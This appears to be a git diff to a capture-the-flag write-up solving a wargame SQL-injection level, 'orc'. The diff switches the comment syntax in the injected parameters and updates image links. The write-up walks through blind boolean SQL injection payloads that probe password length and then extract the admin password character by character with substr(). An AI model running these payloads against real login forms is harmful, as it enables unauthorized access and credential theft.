@@ -5,7 +5,7 @@ pagination_prev: null
 sidebar_position: 4
 ---
 
-![1](https://github.com/Kunull/Write-ups/assets/110326359/3bcdaeff-a4ba-4e3c-8acd-73e2ec8ce6d9)
+![1](https://github.com/Kunull/Write-ups/assets/110326359/3fb3ba7d-5c3a-40cc-8b3a-8dcd16ebe014)
 
 We are provided with the SQL query:
 
@@ -28,13 +28,13 @@ First we have to reveal the length of the flag.
 If we provide the following URI:
 
 ```
-?pw=' OR id='admin' AND length(pw)=1 %23
+?pw=' OR id='admin' AND length(pw)=1 -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1 #'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1 -- -'
 
 ## Queried part:
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1
@@ -43,7 +43,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1
 '
 ```
 
-![2](https://github.com/Kunull/Write-ups/assets/110326359/8a33f464-e7de-4d4a-a47c-7285e7d69ea9)
+![2](https://github.com/Kunull/Write-ups/assets/110326359/d0e5928c-c2a2-4355-a6a2-af11d1804556)
 
 Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
 That tells us that the length of the `pw` column is more than 1.
@@ -51,13 +51,13 @@ That tells us that the length of the `pw` column is more than 1.
 If we keep increasing the length and provide the following URI:
 
 ```
-?pw=' OR id='admin' AND length(pw)=8 %23
+?pw=' OR id='admin' AND length(pw)=8 -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8 #'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8 -- -''
 
 ## Queried part:
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8
@@ -66,7 +66,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND leng
 '
 ```
 
-![3](https://github.com/Kunull/Write-ups/assets/110326359/9d922a6a-4f1e-4b4a-a3bd-e8d8b721ba3e)
+![3](https://github.com/Kunull/Write-ups/assets/110326359/9e438378-10e1-4f7a-9353-bdf75700825d)
 
 Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
 That tells us that the length of the `pw` column is 8.
@@ -77,18 +77,18 @@ Next, we can leak the password byte by byte using the `substr()` function.
 
 #### `substr()`
 
-![4](https://github.com/Kunull/Write-ups/assets/110326359/b1e4352c-c272-4fb7-8401-7d5fe2cc4423)
+![4](https://github.com/Kunull/Write-ups/assets/110326359/e332b358-2371-4f97-a9be-e1e5afce6f68)
 
 If we provide the following URI:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 1, 1)=0 %23
+?pw=' OR id='admin' AND substr(pw, 1, 1)=0 -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 #'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 -- -'
 
 ## Queried part:
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 #
@@ -97,7 +97,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND subs
 '
 ```
 
-![5](https://github.com/Kunull/Write-ups/assets/110326359/53f17b2b-b80d-4b8e-a904-bd88c1cbb7f3)
+![5](https://github.com/Kunull/Write-ups/assets/110326359/065bf0e4-ef24-4a09-8482-036850cd9c18)
 
 Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
 That tells us that the first character of the `pw` for `id=admin` is `0`.
@@ -105,13 +105,13 @@ That tells us that the first character of the `pw` for `id=admin` is `0`.
 We can now move onto the second character:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 2, 1)=0 %23
+?pw=' OR id='admin' AND substr(pw, 2, 1)=0 -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0 #'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0 -- -'
 
 ## Queried part:
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0
@@ -120,7 +120,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND subs
 '
 ```
 
-![6](https://github.com/Kunull/Write-ups/assets/110326359/7abdfbc4-b2e1-4448-ad7e-8e38484d4cc1)
+![6](https://github.com/Kunull/Write-ups/assets/110326359/ca4364db-8e79-4a25-ad50-0b8889822c72)
 
 Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
 That tells us that the second character of the `pw` for `id=admin` is not `0`.
@@ -128,11 +128,13 @@ That tells us that the second character of the `pw` for `id=admin` is not `0`.
 We can try other characters moving up to the following:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 2, 1)=9 %23
+?pw=' OR id='admin' AND substr(pw, 2, 1)=9 -- -
 ```
 
+The resultant query becomes:
+
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9 #'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9 -- -'
 
 ## Queried part:
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=9
@@ -141,7 +143,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND subs
 '
 ```
 
-![7](https://github.com/Kunull/Write-ups/assets/110326359/fcc7790e-333b-4b3c-b197-bfc02f67788d)
+![7](https://github.com/Kunull/Write-ups/assets/110326359/f9133a16-4799-4f4b-bfe3-2105d61d3e72)
 
 Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
 That tells us that the second character of the `pw` for `id=admin` is `9`.
@@ -164,4 +166,4 @@ The resultant query becomes:
 SELECT id FROM prob_orc WHERE id='admin' AND pw='095a9852'
 ```
 
-![8](https://github.com/Kunull/Write-ups/assets/110326359/cee48c8e-2e61-4ccd-93fc-2abe7fb6d417)
+![8](https://github.com/Kunull/Write-ups/assets/110326359/ef9ae213-af29-4450-8d2e-34d02565e928)
